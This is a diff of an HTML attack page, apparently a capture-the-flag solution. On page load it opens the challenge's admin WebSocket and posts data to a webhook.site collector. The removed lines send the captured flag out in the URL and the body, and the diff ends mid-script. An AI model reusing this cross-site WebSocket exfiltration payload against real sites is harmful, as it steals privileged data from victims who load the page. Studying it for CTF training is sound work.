@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Retrieve, Store, and Send Flag</title>
+    <title>Retrieve and Send Simple POST</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const wsUrl = 'ws://ce441-web.spchallenge.ir:8080/admin/ws';
-            const baseUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/';
+            const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a';
 
             // Open WebSocket connection
             console.log('Opening WebSocket connection...');
@@ -25,50 +25,19 @@
                     const flag = event.data;
                     console.log('Flag received:', flag);
 
-                    // Store the flag in localStorage
-                    localStorage.setItem('capturedFlag', flag);
-                    console.log('Flag stored in localStorage');
-
-                    // Construct the full URL with the flag
-                    const webhookUrl = baseUrl + encodeURIComponent(flag);
-                    console.log('Constructed Webhook URL:', webhookUrl);
-
-                    // Send a POST request to the constructed URL
-                    console.log('Sending flag to the constructed webhook URL...');
+                    // Send a simple POST request to the webhook
+                    console.log('Sending simple POST to the webhook...');
                     fetch(webhookUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify({ flag }),
+                        body: JSON.stringify({ message: 'POST request sent successfully' }),
                     })
                     .then(response => {
                         if (response.ok) {
-                            console.log('Flag sent successfully to the webhook URL');
+                            console.log('POST request sent successfully');
                         } else {
-                            console.error('Failed to send flag. Response status:', response.status);
+                            console.error('Failed to send POST. Response status:', response.status);
                         }
-                    })
-                    .catch(error => {
-                        console.error('Error sending flag to the webhook:', error);
-                    });
-                } else {
-                    console.warn('No valid flag found in the WebSocket message');
-                }
-            };
-
-            ws.onerror = (error) => {
-                console.error('WebSocket error:', error);
-            };
-
-            ws.onclose = () => {
-                console.log('WebSocket connection closed');
-            };
-        });
-    </script>
-</head>
-<body>
-    <h1>Retrieve, Store, and Send Flag</h1>
-    <p>The flag will be retrieved, stored, and sent to a dynamically constructed Webhook URL when the page loads. Check the console for details.</p>
-</body>
-</html>
+    
